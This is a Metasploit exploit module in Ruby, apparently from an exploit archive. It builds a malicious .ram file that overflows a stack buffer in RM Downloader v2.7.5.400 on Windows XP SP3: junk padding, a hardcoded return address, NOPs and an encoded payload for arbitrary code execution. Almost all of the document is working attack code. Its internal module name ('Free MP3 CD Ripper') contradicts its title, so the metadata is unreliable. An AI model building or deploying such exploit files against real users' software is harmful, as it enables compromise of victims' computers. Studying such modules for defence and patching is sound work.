###
#[+] Author: TUNISIAN CYBER
#[+] Exploit Title: RM Downloader v2.7.5.400 Local Buffer Overflow (MSF)
#[+] Date: 25-03-2015
#[+] Type: Local Exploits
#[+] Tested on: WinXp/Windows 7 Pro
#[+] Vendor: http://software-files-a.cnet.com/s/software/10/65/60/49/Mini-streamRM-MP3Converter.exe?token=1427318981_98f71d0e10e2e3bd2e730179341feb0a&fileName=Mini-streamRM-MP3Converter.exe
#[+] Twitter: @TCYB3R
##
 
##
# $Id: rmdownloader_bof.rb  2015-04-01 03:03  TUNISIAN CYBER $
##
 
require 'msf/core'
  
class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking
  
  include Msf::Exploit::FILEFORMAT
  
   def initialize(info = {})
    super(update_info(info,
     'Name' => 'Free MP3 CD Ripper 1.1 Local Buffer Overflow Exploit',
         'Description' => %q{
          This module exploits a stack buffer overflow in RM Downloader v2.7.5.400
          creating a specially crafted .ram file, an attacker may be able 
      to execute arbitrary code.
        },
     'License' => MSF_LICENSE,
     'Author' => 
           [
            'TUNISIAN CYBER', # Original
            'TUNISIAN CYBER' # MSF Module
            ],
     'Version' => 'Version 2.7.5.400',
     'References' =>
        [
         [ 'URL', 'https://www.exploit-db.com/exploits/36502/' ],
        ],
    'DefaultOptions' =>
       {
        'EXITFUNC' => 'process',
       },
     'Payload' =>
      {
        'Space' => 1024,
        'BadChars' => "\x00\x0a\x0d",
        'StackAdjustment' => -3500,
      },
     'Platform' => 'win',
     'Targets' =>
       [
        [ 'Windows XP-SP3 (EN)', { 'Ret' => 0x7C9D30D7} ]
       ],
      'Privileged' => false,
      'DefaultTarget' => 0))
  
      register_options(
       [
        OptString.new('FILENAME', [ false, 'The file name.', 'msf.ram']),
       ], self.class)
    end
  
    def exploit
 
    sploit = rand_text_alphanumeric(35032) # Buffer Junk
      sploit << [target.ret].pack('V')
      sploit << make_nops(4)
      sploit << payload.encoded
 
      tc = sploit
      print_status("Creating '#{datastore['FILENAME']}' file ...")
      file_create(tc)
 
    end
  
end